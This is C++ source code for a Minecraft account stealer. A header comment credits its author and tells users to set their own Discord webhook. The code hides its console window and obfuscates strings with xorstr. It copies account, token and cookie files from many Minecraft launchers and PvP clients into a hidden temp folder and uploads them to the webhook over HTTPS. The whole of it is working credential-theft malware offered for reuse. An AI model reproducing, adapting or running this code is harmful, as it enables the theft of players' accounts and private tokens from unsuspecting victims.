


/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/

/*
#include "includes\MinecraftStealer.hpp"
#include "includes\xorstr.hpp"




//this code is the minecraft account stealer


// this is the user path finder
char* Minecraft::userPathFinder() {
    char* userPath = nullptr;
    size_t len;
    errno_t err = _dupenv_s(&userPath, &len, (xorstr_("USERPROFILE")));
    if (err != 0 || userPath == nullptr) {
        return nullptr;
    }
    return userPath;
}

// this shit create directory in temp folder
void Minecraft::createDirectories() {
    char* userPath = userPathFinder();
    if (userPath == nullptr) {
        return;
    }

    fs::path baseDir = fs::path((xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0")));
    fs::create_directories(baseDir);

    fs::create_directory(baseDir / (xorstr_("pvpclients")));
    fs::create_directory(baseDir / (xorstr_("minecraft")));
    fs::create_directory(baseDir / (xorstr_("misc")));

    free(userPath);
}


// this is the get file name
std::string Minecraft::getFileName(const std::filesystem::path& filePath) {
    return filePath.filename().string();
}



//======================= this shit send file to webhook via http =========================//

//credits: https://github.com/Fontesie/discord-webhook-cpp



void Minecraft::sendFileToWebhook(const std::string& filePath, const std::string& webhookURL) {
    // you can modify the name of http petition
    HINTERNET hSession = WinHttpOpen(xorstr_(L"GsRnfrjDNdjTRjrsSdrrN/1.0"),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        (xorstr_(L"discordapp.com")),
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookURLWide = std::wstring(webhookURL.begin(), webhookURL.end());
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        (xorstr_(L"POST")),
        webhookURLWide.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);


    std::string contentDisposition = (xorstr_("Content-Disposition: form-data; name=\"file\"; filename=\"") + getFileName(filePath) + (xorstr_("\"\r\n")));
    std::string contentType = (xorstr_("Content-Type: application/octet-stream\r\n\r\n"));

    std::ifstream fileStream(filePath, std::ios::binary);
    std::string fileContent((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());

    std::string requestBody = (xorstr_("--boundary\r\n")) + contentDisposition + contentType + fileContent + (xorstr_("\r\n--boundary--"));

    BOOL bResults = WinHttpSendRequest(hRequest,
        (xorstr_(L"Content-Type: multipart/form-data; boundary=boundary\r\n")),
        (DWORD)-1L,
        (LPVOID)requestBody.c_str(),
        (DWORD)requestBody.length(),
        (DWORD)requestBody.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// this ugly femboy function read file and if its empty dont send it
void sendFileifEmpty(const std::string& rutaArchivo, const std::string& webhookURL) {
    std::ifstream archivo(rutaArchivo);

    if (archivo.is_open()) {
        std::string contenidoArchivo((std::istreambuf_iterator<char>(archivo)),
                                     (std::istreambuf_iterator<char>()));

        if (!contenidoArchivo.empty()) {
            Minecraft::sendFileToWebhook(rutaArchivo, webhookURL);
        } 
        archivo.close();
    } 


}




//======================= big shit code, this send minecraft accounts to webhook =========================//

//credits: https://github.com/Appolon24800/Minecraft-accounts-paths (for the paths uuwu)



void Minecraft::stealMinecraft() {
    char* userPath = Minecraft::userPathFinder();


    // hide the cmd 
    SetWindowPos(GetConsoleWindow(), NULL, 5000, 5000, 0, 0, 0);
    ShowWindow(GetConsoleWindow(), SW_HIDE);


    Minecraft::createDirectories();
    AntiCrack::checkForCrackingToolsA();
    // misc paths
    std::filesystem::path accountsPathIntent = std::filesystem::path(userPath) / (xorstr_("intentlauncher")) / (xorstr_("launcherconfig"));
    std::filesystem::path accountsPathIntent2 = std::filesystem::path(userPath) / (xorstr_("intentlauncher")) / (xorstr_("Rise")) / (xorstr_("alts.txt"));
    std::filesystem::path accountsPathPoly = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("PolyMC")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathRise = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Rise")) / (xorstr_("alts.txt"));


    // most used pvp clients
    std::filesystem::path accountsPathLunar = std::filesystem::path(userPath) / (xorstr_(".lunarclient")) / (xorstr_("settings")) / (xorstr_("game")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathSoar = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Local")) / (xorstr_(".soarclient")) / (xorstr_("game")) / (xorstr_("soar")) / (xorstr_("Account.json"));
    std::filesystem::path accountsPathBadlion = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Badlion Client")) / (xorstr_(".updaterId"));
    std::filesystem::path accountsPathBadlion2 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Badlion Client")) / (xorstr_("Cookies"));
    std::filesystem::path accountsPathBadlion3 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("Badlion Client")) / (xorstr_("Local State"));
    std::filesystem::path accountsPathFeather = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".feather")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathLabymod = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("LabyMod")) / (xorstr_("launcher-config.json"));
    std::filesystem::path accountsPathLabymod2 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_("LabyMod")) / (xorstr_("launcher-tokens.json"));
    std::filesystem::path accountsPathBlazzing = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".blazingpackclient")) / (xorstr_("config")) / (xorstr_("accounts.json"));
    std::filesystem::path accountsPathBlazzing2 = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".blazingpackclient")) / (xorstr_("config")) / (xorstr_("token.json"));

    // .minecraft paths
    std::filesystem::path accountsPathLauncher = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("launcher_accounts.json"));
    std::filesystem::path accountsPathTeLauncher = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("TlauncherProfiles.json"));
    std::filesystem::path accountsPathMeteor = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("meteor-client")) / (xorstr_("accounts.nbt"));
    std::filesystem::path accountsPathImpact = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("Impact")) / (xorstr_("alts.json"));
    std::filesystem::path accountsPathNovoline = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("Novoline")) / (xorstr_("alts.novo"));
    std::filesystem::path accountsPathCheatBreaker = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("cheatbreaker_accounts.json"));
    std::filesystem::path accountsPathMicrosoft = std::filesystem::path(userPath) / (xorstr_("AppData")) / (xorstr_("Roaming")) / (xorstr_(".minecraft")) / (xorstr_("launcher_accounts_microsoft_store.json"));


    // temp dir paths
    std::filesystem::path pvpclients = std::filesystem::path(xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0\\pvpclients"));
    std::filesystem::path misc = std::filesystem::path(xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0\\misc"));
    std::filesystem::path minecraft = std::filesystem::path(xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0\\minecraft"));

    //============ MISC SHITT ACCOUNTS =============

    std::string comando18 = (xorstr_(" copy ") + accountsPathIntent.string() + " " + misc.string());
    std::string comando19 = (xorstr_(" copy ") + accountsPathIntent2.string() + " " + misc.string());
    std::string comando20 = (xorstr_(" copy ") + accountsPathPoly.string() + " " + misc.string());
    std::string comando21 = (xorstr_(" copy ") + accountsPathRise.string() + " " + misc.string());

    std::string renamecmd18 = (xorstr_("rename ") + misc.string() + (xorstr_("\\intentlauncher\\launcherconfig")) + (xorstr_(" intent.json")));
    std::string renamecmd19 = (xorstr_("rename ") + misc.string() + (xorstr_("\\intentlauncher\\Rise\\alts.txt")) + (xorstr_(" intent2.json")));
    std::string renamecmd20 = (xorstr_("rename ") + misc.string() + (xorstr_("\\polymc\\accounts.json")) + (xorstr_(" poly.json")));
    std::string renamecmd21 = (xorstr_("rename ") + misc.string() + (xorstr_("\\Rise\\alts.txt")) + (xorstr_(" rise.json")));

    if (fs::exists(userPath) + (xorstr_("\\intentlauncher\\launcherconfig"))) {
        if (system(comando18.c_str()) != 0) {
            //std::cout << "error copying accountsPathIntent" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\intentlauncher\\Rise\\alts.txt"))) {
        if (system(comando19.c_str()) != 0) {
            //std::cout << "error copying accountsPathIntent2" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\polymc\\accounts.json"))) {
        if (system(comando20.c_str()) != 0) {
            //std::cout << "error copying accountsPathPoly" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\Rise\\alts.txt"))) {
        if (system(comando21.c_str()) != 0) {
            //std::cout << "error copying accountsPathRise" << std::endl;
        }
    }

    if (fs::exists(misc.string() + (xorstr_("\\intentlauncher\\launcherconfig")))) {
        if (system(renamecmd18.c_str()) != 0) {
            //std::cout << "error renaming accountsPathIntent" << std::endl;
        }
    }

    if (fs::exists(misc.string() + (xorstr_("\\intentlauncher\\Rise\\alts.txt")))) {
        if (system(renamecmd19.c_str()) != 0) {
            //std::cout << "error renaming accountsPathIntent2" << std::endl;
        }
    }

    if (fs::exists(misc.string() + (xorstr_("\\polymc\\accounts.json")))) {
        if (system(renamecmd20.c_str()) != 0) {
            //std::cout << "error renaming accountsPathPoly" << std::endl;
        }
    }

    if (fs::exists(misc.string() + (xorstr_("\\Rise\\alts.txt")))) {
        if (system(renamecmd21.c_str()) != 0) {
            //std::cout << "error renaming accountsPathRise" << std::endl;
        }
    }
    AntiCrack::checkForCrackingToolsA();
    //============ SHITTY MINECRAFT ACCOUNTS =============

    std::string comando11 = (xorstr_(" copy ") + accountsPathLauncher.string() + " " + minecraft.string());
    std::string comando12 = (xorstr_(" copy ") + accountsPathTeLauncher.string() + " " + minecraft.string());
    std::string comando13 = (xorstr_(" copy ") + accountsPathMeteor.string() + " " + minecraft.string());
    std::string comando14 = (xorstr_(" copy ") + accountsPathImpact.string() + " " + minecraft.string());
    std::string comando15 = (xorstr_(" copy ") + accountsPathNovoline.string() + " " + minecraft.string());
    std::string comando16 = (xorstr_(" copy ") + accountsPathCheatBreaker.string() + " " + minecraft.string());
    std::string comando17 = (xorstr_(" copy ") + accountsPathMicrosoft.string() + " " + minecraft.string());

    std::string renamecmd11 = (xorstr_("rename ") + minecraft.string() + (xorstr_("\\launcher_accounts.json")) + (xorstr_(" minecraft.json")));
    std::string renamecmd12 = (xorstr_("rename ") + minecraft.string() + (xorstr_("\\TlauncherProfiles.json")) + (xorstr_(" tlauncher.json")));
    std::string renamecmd13 = (xorstr_("rename ") + minecraft.string() + (xorstr_("\\meteor-client\\accounts.nbt")) + (xorstr_(" meteor.json")));
    std::string renamecmd14 = (xorstr_("rename ") + minecraft.string() + (xorstr_("\\Impact\\alts.json")) + (xorstr_(" impact.json"))); 
    std::string renamecmd15 = (xorstr_("rename ") + minecraft.string() + (xorstr_("\\Novoline\\alts.novo")) + (xorstr_(" novoline.json")));
    std::string renamecmd16 = (xorstr_("rename ") + minecraft.string() + (xorstr_("\\cheatbreaker_accounts.json")) + (xorstr_(" cheatbreaker.json")));
    std::string renamecmd17 = (xorstr_("rename ") + minecraft.string() + (xorstr_("\\launcher_accounts_microsoft_store.json")) + (xorstr_(" microsoft.json")));


    if (fs::exists(userPath) +  (xorstr_("\\AppData\\Roaming\\.minecraft\\launcher_accounts.json"))) {
        if (system(comando11.c_str()) != 0) {
            //std::cout << "error copying accountsPathLauncher" << std::endl;
        }
    }

    if (fs::exists(userPath) +  (xorstr_("\\AppData\\Roaming\\.minecraft\\TlauncherProfiles.json"))) {
        if (system(comando12.c_str()) != 0) {
            //std::cout << "error copying accountsPathTeLauncher" << std::endl;
        }
    }

    if (fs::exists(userPath) +  (xorstr_("\\AppData\\Roaming\\.minecraft\\meteor-client\\accounts.nbt"))) {
        if (system(comando13.c_str()) != 0) {
            //std::cout << "error copying accountsPathMeteor" << std::endl;
        }
    }

    if (fs::exists(userPath) +  (xorstr_("\\AppData\\Roaming\\.minecraft\\Impact\\alts.json"))) {
        if (system(comando14.c_str()) != 0) {
            //std::cout << "error copying accountsPathImpact" << std::endl;
        }
    }

    if (fs::exists(userPath) +  (xorstr_("\\AppData\\Roaming\\.minecraft\\Novoline\\alts.novo"))) {
        if (system(comando15.c_str()) != 0) {
            //std::cout << "error copying accountsPathNovoline" << std::endl;
        }
    }

    if (fs::exists(userPath) +  (xorstr_("\\AppData\\Roaming\\.minecraft\\cheatbreaker_accounts.json"))) {
        if (system(comando16.c_str()) != 0) {
            //std::cout << "error copying accountsPathCheatBreaker" << std::endl;
        }
    }

    if (fs::exists(userPath) +  (xorstr_("\\AppData\\Roaming\\.minecraft\\launcher_accounts_microsoft_store.json"))) {
        if (system(comando17.c_str()) != 0) {
            //std::cout << "error copying accountsPathMicrosoft" << std::endl;
        }
    }

    if (fs::exists(minecraft.string() +  (xorstr_("\\launcher_accounts.json")))) {
        if (system(renamecmd11.c_str()) != 0) {
            //std::cout << "error renaming accountsPathLauncher" << std::endl;
        }
    }

    if (fs::exists(minecraft.string() +  (xorstr_("\\TlauncherProfiles.json")))) {
        if (system(renamecmd12.c_str()) != 0) {
            //std::cout << "error renaming accountsPathTeLauncher" << std::endl;
        }
    }

    if (fs::exists(minecraft.string() +  (xorstr_("\\meteor-client\\accounts.nbt")))) {
        if (system(renamecmd13.c_str()) != 0) {
            //std::cout << "error renaming accountsPathMeteor" << std::endl;
        }
    }

    if (fs::exists(minecraft.string() +  (xorstr_("\\Impact\\alts.json")))) {
        if (system(renamecmd14.c_str()) != 0) {
            //std::cout << "error renaming accountsPathImpact" << std::endl;
        }
    }

    if (fs::exists(minecraft.string() +  (xorstr_("\\Novoline\\alts.novo")))) {
        if (system(renamecmd15.c_str()) != 0) {
            //std::cout << "error renaming accountsPathNovoline" << std::endl;
        }
    }

    if (fs::exists(minecraft.string() + (xorstr_("\\cheatbreaker_accounts.json")))) {
        if (system(renamecmd16.c_str()) != 0) {
            //std::cout << "error renaming accountsPathCheatBreaker" << std::endl;
        }
    }

    if (fs::exists(minecraft.string() + (xorstr_("\\launcher_accounts_microsoft_store.json")))) {
        if (system(renamecmd17.c_str()) != 0) {
            //std::cout << "error renaming accountsPathMicrosoft" << std::endl;
        }
    }

    AntiCrack::checkForCrackingToolsA();
    //============ PVP CLIENTS =============

    std::string comando = (xorstr_(" copy ") + accountsPathLunar.string() + " " + pvpclients.string());
    std::string comando2 = (xorstr_(" copy ") + accountsPathSoar.string() + " " + pvpclients.string());
    std::string comando3 = (xorstr_(" copy ") + accountsPathBadlion.string() + " " + pvpclients.string());
    std::string comando4 = (xorstr_(" copy ") + accountsPathBadlion2.string() + " " + pvpclients.string());
    std::string comando5 = (xorstr_(" copy ") + accountsPathBadlion3.string() + " " + pvpclients.string());
    std::string comando6 = (xorstr_(" copy ") + accountsPathFeather.string() + " " + pvpclients.string());
    std::string comando7 = (xorstr_(" copy ") + accountsPathLabymod.string() + " " + pvpclients.string());
    std::string comando8 = (xorstr_(" copy ") + accountsPathLabymod2.string() + " " + pvpclients.string()); 
    std::string comando9 = (xorstr_(" copy ") + accountsPathBlazzing.string() + " " + pvpclients.string());
    std::string comando10 = (xorstr_(" copy ") + accountsPathBlazzing2.string() + " " + pvpclients.string());

    std::string renamecmd = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\accounts.json")) + (xorstr_(" lunar.json")));
    std::string renamecmd2 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\Account.json")) + (xorstr_(" soar.json")));
    std::string renamecmd3 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\alts.txt")) + (xorstr_(" badlion.json")));
    std::string renamecmd4 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\Cookies")) + (xorstr_(" badlion2.json")));
    std::string renamecmd5 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\Local State")) + (xorstr_(" badlion3.json")));
    std::string renamecmd6 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\accounts.json")) + (xorstr_(" feather.json")));
    std::string renamecmd7 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\token.json")) + (xorstr_(" labymod.json")));
    std::string renamecmd8 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\accounts.json")) + (xorstr_(" labymod2.json")));
    std::string renamecmd9 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\accounts.json")) + (xorstr_(" blazzing.json")));  
    std::string renamecmd10 = (xorstr_("rename ") + pvpclients.string() + (xorstr_("\\token.json")) + (xorstr_(" blazzing2.json")));


    AntiCrack::checkForCrackingToolsA();

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\.lunarclient\\settings\\game\\accounts.json"))) {
        if (system(comando.c_str()) != 0) {
            //std::cout << "error copying accountsPathLunar" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\accounts.json")))) {
        if (system(renamecmd.c_str()) != 0) {
            //std::cout << "error renaming accountsPathLunar" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Local\\.soarclient\\game\\soar\\Account.json"))) {
        if (system(comando2.c_str()) != 0) {
            //std::cout << "error copying accountsPathSoar" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\Account.json")))) {
        if (system(renamecmd2.c_str()) != 0) {
            //std::cout << "error renaming accountsPathSoar" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\Badlion Client\\.updaterId"))) {
        if (system(comando3.c_str()) != 0) {
            //std::cout << "error copying accountsPathBadlion" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\.updaterId")))) {
        if (system(renamecmd3.c_str()) != 0) {
            //std::cout << "error renaming accountsPathBadlion" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\Badlion Client\\Cookies"))) {
        if (system(comando4.c_str()) != 0) {
            //std::cout << "error copying accountsPathBadlion2" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\Cookies")))) {
        if (system(renamecmd4.c_str()) != 0) {
            //std::cout << "error renaming accountsPathBadlion2" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\Badlion Client\\Local State"))) {
        if (system(comando5.c_str()) != 0) {
            //std::cout << "error copying accountsPathBadlion3" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\Local State")))) {
        if (system(renamecmd5.c_str()) != 0) {
            //std::cout << "error renaming accountsPathBadlion3" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\.feather\\accounts.json"))) {
        if (system(comando6.c_str()) != 0) {
            //std::cout << "error copying accountsPathFeather" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\config\\accounts.json")))) {
        if (system(renamecmd6.c_str()) != 0) {
            //std::cout << "error renaming accountsPathFeather" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\LabyMod\\launcher-config.json"))) {
        if (system(comando7.c_str()) != 0) {
            //std::cout << "error copying accountsPathLabymod" << std::endl;
        }
    }


    if (fs::exists(pvpclients.string() + (xorstr_("\\config\\token.json")))) {
        if (system(renamecmd7.c_str()) != 0) {
            //std::cout << "error renaming accountsPathLabymod" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\LabyMod\\launcher-tokens.json"))) {
        if (system(comando8.c_str()) != 0) {
            //std::cout << "error copying accountsPathLabymod2" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\config\\accounts.json")))) {
        if (system(renamecmd8.c_str()) != 0) {
            //std::cout << "error renaming accountsPathLabymod2" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\.blazingpackclient\\config\\accounts.json"))) {
        if (system(comando9.c_str()) != 0) {
            //std::cout << "error copying accountsPathBlazzing" << std::endl;
        }
    }

    if (fs::exists(pvpclients.string() + (xorstr_("\\config\\accounts.json")))) {
        if (system(renamecmd9.c_str()) != 0) {
            //std::cout << "error renaming accountsPathBlazzing" << std::endl;
        }
    }

    if (fs::exists(userPath) + (xorstr_("\\AppData\\Roaming\\.blazingpackclient\\config\\token.json"))) {
        if (system(comando10.c_str()) != 0) {
            //std::cout << "error copying accountsPathBlazzing2" << std::endl;
        }
    }
    if (fs::exists(pvpclients.string() + (xorstr_("\\config\\token.json")))) {
        if (system(renamecmd10.c_str()) != 0) {
            //std::cout << "error renaming accountsPathBlazzing2" << std::endl;
        }
    }

    AntiCrack::checkForCrackingToolsA();

    /*
    if (!fs::exists(pvpclients)) {
        std::cout << "pvpclients directory does not exist" << std::endl;
    }
    else if (!fs::exists(misc)) {
        std::cout << "misc directory does not exist" << std::endl;
    }
    else if (!fs::exists(minecraft)) {
        std::cout << "minecraft directory does not exist" << std::endl;
    }
    else {
        std::cout << "all directories exist" << std::endl;
    }

    AntiCrack::checkForCrackingToolsA();


    sendFileifEmpty(misc.string() + (xorstr_("\\intent.json")), webhookURL);
    sendFileifEmpty(misc.string() + (xorstr_("\\intent2.json")), webhookURL);
    sendFileifEmpty(misc.string() + (xorstr_("\\poly.json")), webhookURL);
    sendFileifEmpty(misc.string() + (xorstr_("\\rise.json")), webhookURL);

    sendFileifEmpty(minecraft.string() + (xorstr_("\\minecraft.json")), webhookURL);
    sendFileifEmpty(minecraft.string() + (xorstr_("\\tlauncher.json")), webhookURL);
    sendFileifEmpty(minecraft.string() + (xorstr_("\\meteor.json")), webhookURL);
    sendFileifEmpty(minecraft.string() + (xorstr_("\\impact.json")), webhookURL);
    sendFileifEmpty(minecraft.string() + (xorstr_("\\novoline.json")), webhookURL);
    sendFileifEmpty(minecraft.string() + (xorstr_("\\cheatbreaker.json")), webhookURL);
    sendFileifEmpty(minecraft.string() + (xorstr_("\\microsoft.json")), webhookURL);


    sendFileifEmpty(pvpclients.string() + (xorstr_("\\lunar.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\soar.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\badlion.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\badlion2.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\badlion3.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\feather.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\labymod.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\labymod2.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\blazzing.json")), webhookURL);
    sendFileifEmpty(pvpclients.string() + (xorstr_("\\blazzing2.json")), webhookURL);
    

    // remove the temp folder 
    //if (fs::exists(xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0"))) {
        //fs::remove_all(xorstr_("C:\\Windows\\Temp\\dmDndwfduwucdUDNrMCU0"));
    //}

    AntiCrack::checkForCrackingToolsA();

    free(userPath);

    //std::cout << (xorstr_("tokens embeds!")) << std::endl;

    AntiCrack::checkForCrackingToolsA();
}
*/